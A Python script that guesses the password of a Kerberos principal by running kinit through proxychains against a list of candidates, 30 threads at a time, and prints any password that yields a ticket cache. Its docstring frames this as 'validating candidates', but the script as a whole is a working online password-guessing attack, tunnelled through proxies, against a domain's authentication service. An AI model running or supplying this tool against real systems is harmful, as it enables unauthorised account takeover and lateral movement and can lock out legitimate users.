#!/usr/bin/env python3
"""Validate Kerberos password candidates with native kinit through proxychains."""
import argparse
import concurrent.futures
import os
from pathlib import Path
import subprocess
import tempfile

p = argparse.ArgumentParser()
p.add_argument("passwords", type=Path)
p.add_argument("--principal", required=True)
p.add_argument("--krb5-config", type=Path, required=True)
p.add_argument("--proxychains", type=Path, required=True,
               help="proxychains configuration file")
p.add_argument("--proxychains-bin", default="proxychains4")
p.add_argument("--workers", type=int, default=30)
a = p.parse_args()
candidates = a.passwords.read_text(encoding="utf-8").splitlines()


def test(item):
    index, password = item
    fd, cache = tempfile.mkstemp(
        prefix=f"kinit-candidate-{index}-", suffix=".ccache")
    os.close(fd)
    os.unlink(cache)
    env = os.environ.copy()
    env["KRB5_CONFIG"] = str(a.krb5_config.resolve())
    env["KRB5CCNAME"] = "FILE:" + cache
    command = [a.proxychains_bin, "-f", str(a.proxychains.resolve()), "-q",
               "kinit", a.principal]
    try:
        try:
            result = subprocess.run(command, input=password + "\n", text=True,
                                    capture_output=True, env=env, timeout=10)
        except subprocess.TimeoutExpired:
            return "error", password, "kinit timeout"
        success = (result.returncode == 0 and Path(cache).is_file() and
                   Path(cache).stat().st_size > 0)
        if success:
            return "match", password, (
                f"rc={result.returncode} {result.stderr.strip()}".strip())
        return "negative", password, ""
    finally:
        Path(cache).unlink(missing_ok=True)


print(f"testing={len(candidates)}", flush=True)
matches = []
errors = []
with concurrent.futures.ThreadPoolExecutor(max_workers=a.workers) as executor:
    for result in executor.map(test, enumerate(candidates)):
        kind, password, detail = result
        if kind == "match":
            matches.append(password)
            print(f"CANDIDATE {password!r} {detail}", flush=True)
        elif kind == "error":
            errors.append((password, detail))
if errors:
    for password, detail in errors[:10]:
        print(f"ERROR {password!r} {detail}", flush=True)
    raise SystemExit(f"{len(errors)} candidates were not tested conclusively")
if len(matches) != 1:
    raise SystemExit(
        f"expected exactly one valid candidate, observed {len(matches)}")
print(f"MATCH={matches[0]}", flush=True)
